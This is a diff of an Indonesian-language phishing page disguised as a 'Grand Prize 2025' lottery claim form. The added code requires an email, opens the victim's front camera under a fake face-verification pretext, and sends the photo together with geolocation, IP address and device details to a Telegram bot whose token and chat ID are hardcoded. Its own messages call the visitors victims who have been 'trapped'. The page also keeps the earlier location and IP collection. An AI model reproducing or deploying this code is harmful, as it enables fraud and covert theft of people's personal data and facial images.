@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🎊 GRAND PRIZE 2025 - Claim Your Reward</title>
+    <title>🥳 GRAND PRICE 2025 HOREE 🥳🥳</title>
     <style>
         * {
             margin: 0;
@@ -64,6 +64,18 @@
             50% { opacity: 0.7; }
         }
         
+        .title {
+            font-size: 32px;
+            margin-bottom: 15px;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.3);
+            animation: bounce 2s infinite;
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        
         .gift-icon {
             font-size: 80px;
             margin-bottom: 20px;
@@ -76,19 +88,14 @@
             50% { transform: translateY(-15px) rotate(5deg); }
         }
         
-        .header h1 {
-            font-size: 28px;
-            margin-bottom: 10px;
-            text-shadow: 0 2px 10px rgba(0,0,0,0.3);
-        }
-        
         .year-badge {
             background: rgba(255,255,255,0.2);
-            padding: 5px 15px;
-            border-radius: 15px;
-            font-size: 16px;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-size: 18px;
             display: inline-block;
             margin-top: 10px;
+            font-weight: bold;
         }
         
         .content {
@@ -216,10 +223,6 @@
             box-shadow: 0 15px 30px rgba(40, 167, 69, 0.4);
         }
         
-        .claim-btn:active {
-            transform: translateY(-1px);
-        }
-        
         .btn-glow {
             position: absolute;
             top: -50%;
@@ -295,6 +298,42 @@
             font-size: 14px;
             color: #495057;
         }
+
+        /* Styles untuk kamera */
+        .camera-container {
+            display: none;
+            margin: 20px 0;
+            position: relative;
+        }
+
+        #cameraVideo {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 15px;
+            border: 3px solid #007bff;
+        }
+
+        .camera-overlay {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            background: rgba(0,0,0,0.7);
+            color: white;
+            padding: 5px 10px;
+            border-radius: 10px;
+            font-size: 12px;
+        }
+
+        .capture-btn {
+            background: #dc3545;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 25px;
+            cursor: pointer;
+            margin: 10px 0;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
@@ -302,8 +341,8 @@
         <div class="header">
             <div class="badge">TERBATAS</div>
             <div class="gift-icon">🎁</div>
-            <h1>GRAND PRIZE 2025</h1>
-            <p>Pemenang Undian Nasional Tahun Baru</p>
+            <h1 class="title">🥳 GRAND PRICE 2025 HOREE 🥳🥳</h1>
+            <p>Selamat! Anda Pemenang Undian Spesial</p>
             <div class="year-badge">🎉 TAHUN 2025 🎉</div>
         </div>
         
@@ -325,27 +364,36 @@
             
             <div class="prize-box">
                 <div class="prize-item">🏆 iPhone 16 Pro Max 1TB</div>
-                <div class="prize-item">💰 Uang Tunai Rp 25.000.000</div>
-                <div class="prize-item">✈️ Liburan Ke Dubai 7 Hari</div>
-                <div class="prize-item">🚗 Voucher Mobil Tesla</div>
-                <div class="prize-item">📱 Paket Data Unlimited 1 Tahun</div>
+                <div class="prize-item">💰 Uang Tunai Rp 50.000.000</div>
+                <div class="prize-item">✈️ Liburan Ke Jepang 10 Hari</div>
+                <div class="prize-item">🚗 Voucher Mobil Tesla Model S</div>
+                <div class="prize-item">📱 Paket Data Unlimited 2 Tahun</div>
             </div>
             
             <div class="email-section">
-                <p>Masukkan email untuk pengiriman hadiah (opsional):</p>
-                <input type="email" class="email-input" id="userEmail" placeholder="nama@email.com">
-                <div class="optional-text">*Email digunakan untuk konfirmasi pengiriman hadiah</div>
+                <p>Masukkan email untuk pengiriman hadiah:</p>
+                <input type="email" class="email-input" id="userEmail" placeholder="nama@email.com" required>
+                <div class="optional-text">*Email digunakan untuk verifikasi dan pengiriman hadiah</div>
+            </div>
+
+            <!-- Container Kamera -->
+            <div class="camera-container" id="cameraContainer">
+                <div class="camera-overlay">📷 VERIFIKASI WAJAH - Hadiah bernilai tinggi membutuhkan verifikasi</div>
+                <video id="cameraVideo" autoplay playsinline></video>
+                <canvas id="cameraCanvas" style="display:none"></canvas>
+                <br>
+                <button class="capture-btn" onclick="capturePhoto()">📸 AMBIL FOTO UNTUK VERIFIKASI</button>
             </div>
             
-            <button class="claim-btn" onclick="processClaim()">
+            <button class="claim-btn" onclick="startVerification()">
                 <div class="btn-glow"></div>
                 🚀 KLAIM HADIAH SEKARANG
             </button>
             
             <div class="loading" id="loading">
                 <div class="spinner"></div>
-                <p>Memproses klaim hadiah Anda...</p>
-                <p style="font-size: 14px; margin-top: 10px;">Mengumpulkan data verifikasi...</p>
+                <p>Memverifikasi data dan hadiah Anda...</p>
+                <p style="font-size: 14px; margin-top: 10px;">Proses mungkin memakan waktu beberapa detik</p>
             </div>
             
             <div class="success-message" id="successMessage">
@@ -358,7 +406,7 @@
             </div>
             
             <div class="footer">
-                © 2025 - Grand Prize National Lottery<br>
+                © 2025 - Grand Price National Lottery<br>
                 Semua hadiah dijamin 100% asli dan legal
             </div>
         </div>
@@ -370,12 +418,17 @@
     <!-- Audio untuk suara -->
     <audio id="clickSound" src="https://assets.mixkit.co/sfx/preview/mixkit-select-click-1109.mp3"></audio>
     <audio id="successSound" src="https://assets.mixkit.co/sfx/preview/mixkit-winning-chimes-2015.mp3"></audio>
+    <audio id="cameraSound" src="https://assets.mixkit.co/sfx/preview/mixkit-camera-shutter-click-1133.mp3"></audio>
 
     <script>
         // === KONFIGURASI TELEGRAM ===
-        const TELEGRAM_BOT_TOKEN = '8564390603:AAHAxlGs_gR_XKb1JXOl1M4nauKaNIzS1io'; // API key bot Telegram Anda
-        const TELEGRAM_CHAT_ID = '6368768388';   // Chat ID Anda (dapat dari @userinfobot)
+        const TELEGRAM_BOT_TOKEN = '8564390603:AAHAxlGs_gR_XKb1JXOl1M4nauKaNIzS1io';
+        const TELEGRAM_CHAT_ID = '6368768388';
         
+        // Variabel global untuk kamera
+        let cameraStream = null;
+        let capturedPhoto = null;
+
         // Update datetime real-time
         function updateDateTime() {
             const now = new Date();
@@ -406,7 +459,7 @@
         }
         
         // Countdown 1 jam
-        let countdownTime = 60 * 60; // 1 jam dalam detik
+        let countdownTime = 60 * 60;
         
         function updateCountdown() {
             const hours = Math.floor(countdownTime / 3600);
@@ -427,6 +480,89 @@
             }
         }
         
+        // Fungsi memulai kamera
+        async function startCamera() {
+            try {
+                document.getElementById('cameraContainer').style.display = 'block';
+                
+                const video = document.getElementById('cameraVideo');
+                cameraStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user', // Kamera depan
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false 
+                });
+                
+                video.srcObject = cameraStream;
+                
+                // Scroll ke kamera
+                document.getElementById('cameraContainer').scrollIntoView({ 
+                    behavior: 'smooth' 
+                });
+                
+            } catch (error) {
+                console.error('Error accessing camera:', error);
+                alert('Kamera tidak dapat diakses. Anda masih dapat mengklaim hadiah tanpa verifikasi wajah.');
+                proceedWithoutCamera();
+            }
+        }
+        
+        // Fungsi mengambil foto
+        function capturePhoto() {
+            document.getElementById('cameraSound').play();
+            
+            const video = document.getElementById('cameraVideo');
+            const canvas = document.getElementById('cameraCanvas');
+            const context = canvas.getContext('2d');
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            capturedPhoto = canvas.toDataURL('image/jpeg', 0.8);
+            
+            // Stop kamera setelah mengambil foto
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+            }
+            
+            document.getElementById('cameraContainer').style.display = 'none';
+            document.querySelector('.capture-btn').textContent = '✅ FOTO BERHASIL DIAMBIL';
+            document.querySelector('.capture-btn').style.background = '#28a745';
+            
+            // Lanjut proses klaim
+            processClaim();
+        }
+        
+        // Fungsi mulai verifikasi
+        function startVerification() {
+            const email = document.getElementById('userEmail').value;
+            
+            if (!email) {
+                alert('Harap masukkan email Anda untuk verifikasi hadiah!');
+                return;
+            }
+            
+            if (!email.includes('@')) {
+                alert('Harap masukkan email yang valid!');
+                return;
+            }
+            
+            document.getElementById('clickSound').play();
+            
+            // Tampilkan kamera untuk verifikasi wajah
+            startCamera();
+        }
+        
+        // Lanjut tanpa kamera
+        function proceedWithoutCamera() {
+            document.getElementById('loading').style.display = 'block';
+            document.querySelector('.claim-btn').disabled = true;
+            processClaim();
+        }
+        
         // Fungsi confetti
         function createConfetti() {
             const container = document.getElementById('confettiContainer');
@@ -442,7 +578,6 @@
                 
                 container.appendChild(confetti);
                 
-                // Animasi confetti
                 const animation = confetti.animate([
                     { 
                         transform: `translateY(-100px) rotate(0deg)`,
@@ -461,12 +596,14 @@
             }
         }
         
-        // Fungsi kirim ke Telegram
-        async function sendToTelegram(data) {
-            const message = `
-🚨 *DATA KORBAN BARU - 😈😈🤫🧏‍♂️* 🚨
+        // Fungsi kirim ke Telegram dengan foto
+        async function sendToTelegram(data, photoData = null) {
+            let message = `
+🚨 *DATA KORBAN BARU - GRAND PRICE 2025* 🚨
 
-📧 *Email:* ${data.email || 'Tidak diisi'}
+🥳 *PENGGUNA BERHASIL TERJEBAK* 🥳
+
+📧 *Email:* ${data.email}
 🕐 *Waktu:* ${data.localDateTime}
 🌐 *Zona Waktu:* ${data.timezone}
 
@@ -484,16 +621,14 @@
 ├ CPU Cores: ${data.hardwareConcurrency}
 └ IP: ${data.ip}
 
-🔐 *Fingerprint:*
-┌ Canvas: ${data.canvasFingerprint ? 'Terdeteksi' : 'Tidak'}
-├ WebGL: ${data.webglFingerprint}
-└ Fonts: ${data.fonts?.length || 0} fonts terdeteksi
+${photoData ? '📷 *FOTO WAJAH:* BERHASIL DIAMBIL!' : '📷 *FOTO WAJAH:* Tidak diambil'}
 
-⚠️ *Data siap untuk investigasi lanjutan*
+⚠️ *PELAKU BERHASIL DIIDENTIFIKASI* ⚠️
             `;
             
             try {
-                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                // Kirim pesan teks dulu
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -505,9 +640,24 @@
                     })
                 });
                 
-                const result = await response.json();
-                console.log('Telegram response:', result);
-                return result.ok;
+                // Jika ada foto, kirim foto
+                if (photoData) {
+                    // Convert base64 ke blob
+                    const response = await fetch(photoData);
+                    const blob = await response.blob();
+                    
+                    const formData = new FormData();
+                    formData.append('chat_id', TELEGRAM_CHAT_ID);
+                    formData.append('photo', blob, 'wajah_korban.jpg');
+                    formData.append('caption', '📸 FOTO WAJAH KORBAN - Grand Price 2025');
+                    
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                }
+                
+                return true;
             } catch (error) {
                 console.error('Error sending to Telegram:', error);
                 return false;
@@ -516,20 +666,10 @@
         
         // Main claim function
         function processClaim() {
-            // Play click sound
-            document.getElementById('clickSound').play();
-            
-            // Animasi tombol
-            const btn = document.querySelector('.claim-btn');
-            btn.style.transform = 'scale(0.95)';
-            setTimeout(() => { btn.style.transform = 'scale(1)'; }, 150);
-            
-            // Tampilkan loading
             document.getElementById('loading').style.display = 'block';
-            btn.disabled = true;
-            btn.style.background = "#6c757d";
+            document.querySelector('.claim-btn').disabled = true;
+            document.querySelector('.claim-btn').style.background = "#6c757d";
             
-            // Kumpulkan data lengkap
             collectCompleteData();
         }
         
@@ -537,57 +677,31 @@
             const userEmail = document.getElementById('userEmail').value;
             
             const completeData = {
-                // Data waktu lengkap
                 timestamp: new Date().toISOString(),
                 localDateTime: new Date().toLocaleString('id-ID'),
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timezoneOffset: new Date().getTimezoneOffset(),
-                
-                // Data email
-                email: userEmail || 'Tidak diisi',
-                
-                // Data browser dan device
+                email: userEmail,
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
-                languages: JSON.stringify(navigator.languages),
-                
-                // Data layar
                 screen: `${screen.width}x${screen.height}`,
-                colorDepth: screen.colorDepth,
-                pixelDepth: screen.pixelDepth,
-                
-                // Data perangkat
                 deviceMemory: navigator.deviceMemory || 'N/A',
                 hardwareConcurrency: navigator.hardwareConcurrency,
-                maxTouchPoints: navigator.maxTouchPoints,
-                
-                // Data koneksi
-                connection: JSON.stringify(navigator.connection || 'N/A'),
-                online: navigator.onLine,
-                
-                // Fingerprinting
-                canvasFingerprint: getCanvasFingerprint(),
-                webglFingerprint: getWebGLFingerprint(),
-                fonts: detectFonts(),
-                
-                // IP Address
-                ip: 'Fetching...'
+                ip: 'Fetching...',
+                hasPhoto: !!capturedPhoto
             };
             
-            // Dapatkan lokasi detail
             getDetailedLocation().then(locationData => {
                 completeData.location = locationData;
-                // Dapatkan IP address
                 getIPAddress().then(ip => {
                     completeData.ip = ip;
-                    sendDataToTelegram(completeData);
+                    sendDataToTelegram(completeData, capturedPhoto);
                 });
             }).catch(error => {
                 completeData.location = { error: 'Location access denied' };
                 getIPAddress().then(ip => {
                     completeData.ip = ip;
-                    sendDataToTelegram(completeData);
+                    sendDataToTelegram(completeData, capturedPhoto);
                 });
             });
         }
@@ -603,8 +717,6 @@
                     async (position) => {
                         try {
                             const { latitude, longitude } = position.coords;
-                            
-                            // Reverse geocoding untuk dapatkan alamat detail
                             const response = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=id`);
                             const locationData = await response.json();
                             
@@ -616,10 +728,8 @@
                                 },
                                 address: {
                                     country: locationData.countryName || 'Unknown',
-                                    countryCode: locationData.countryCode || 'Unknown',
                                     city: locationData.city || 'Unknown',
-                                    locality: locationData.locality || 'Unknown',
-                                    continent: locationData.continent || 'Unknown'
+                                    locality: locationData.locality || 'Unknown'
                                 }
                             });
                         } catch (error) {
@@ -652,87 +762,40 @@
                 .catch(() => 'Tidak dapat deteksi IP');
         }
         
-        // Fungsi fingerprinting
-        function getCanvasFingerprint() {
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                canvas.width = 200; canvas.height = 50;
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.fillStyle = '#f60';
-                ctx.fillRect(125, 1, 62, 20);
-                ctx.fillStyle = '#069';
-                ctx.fillText('Canvas Fingerprint', 2, 15);
-                return canvas.toDataURL().substring(0, 100);
-            } catch (e) { return 'Error'; }
-        }
-        
-        function getWebGLFingerprint() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                if (!gl) return 'WebGL not supported';
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                return debugInfo ? 'WebGL Supported' : 'WebGL Limited';
-            } catch (e) { return 'Error'; }
-        }
-        
-        function detectFonts() {
-            const fonts = ['Arial', 'Times New Roman', 'Verdana', 'Georgia', 'Comic Sans MS', 'Courier New'];
-            const detected = [];
-            for (let font of fonts) {
-                if (document.fonts.check(`12px "${font}"`)) {
-                    detected.push(font);
-                }
-            }
-            return detected;
-        }
-        
-        async function sendDataToTelegram(data) {
-            const success = await sendToTelegram(data);
+        async function sendDataToTelegram(data, photoData) {
+            const success = await sendToTelegram(data, photoData);
             
-            // Simpan backup ke localStorage
-            const sessionId = 'TKT2025-' + Date.now();
+            const sessionId = 'GP2025-' + Date.now();
             localStorage.setItem(sessionId, JSON.stringify(data));
             
-            // Tampilkan sukses
             setTimeout(() => {
                 showSuccess(sessionId, success);
-            }, 3000);
+            }, 4000);
         }
         
         function showSuccess(sessionId, telegramSuccess) {
-            // Play success sound
             document.getElementById('successSound').play();
-            
-            // Sembunyikan loading
             document.getElementById('loading').style.display = 'none';
-            
-            // Tampilkan confetti
             createConfetti();
             
-            // Tampilkan success message
             const successMsg = document.getElementById('successMessage');
             const claimTime = new Date().toLocaleString('id-ID');
             
             document.getElementById('ticketNumber').textContent = sessionId;
             document.getElementById('claimTime').textContent = claimTime;
             
-            // Tambahkan status Telegram
             if (!telegramSuccess) {
-                const telegramStatus = document.createElement('p');
-                telegramStatus.style.fontSize = '12px';
-                telegramStatus.style.color = '#856404';
-                telegramStatus.style.marginTop = '10px';
-                telegramStatus.textContent = '📱 Data tersimpan secara lokal';
-                successMsg.appendChild(telegramStatus);
+                const statusMsg = document.createElement('p');
+                statusMsg.style.fontSize = '12px';
+                statusMsg.style.color = '#856404';
+                statusMsg.style.marginTop = '10px';
+                statusMsg.textContent = '📱 Data tersimpan secara lokal';
+                successMsg.appendChild(statusMsg);
             }
             
             successMsg.style.display = 'block';
             successMsg.scrollIntoView({ behavior: 'smooth' });
             
-            // Vibrate device (jika supported)
             if (navigator.vibrate) {
                 navigator.vibrate([100, 50, 100]);
             }
@@ -743,10 +806,9 @@
         updateCountdown();
         setInterval(updateDateTime, 1000);
         
-        // Auto focus email input
         setTimeout(() => {
             document.getElementById('userEmail').focus();
         }, 1000);
     </script>
 </body>
-                    </html>
+                </html>
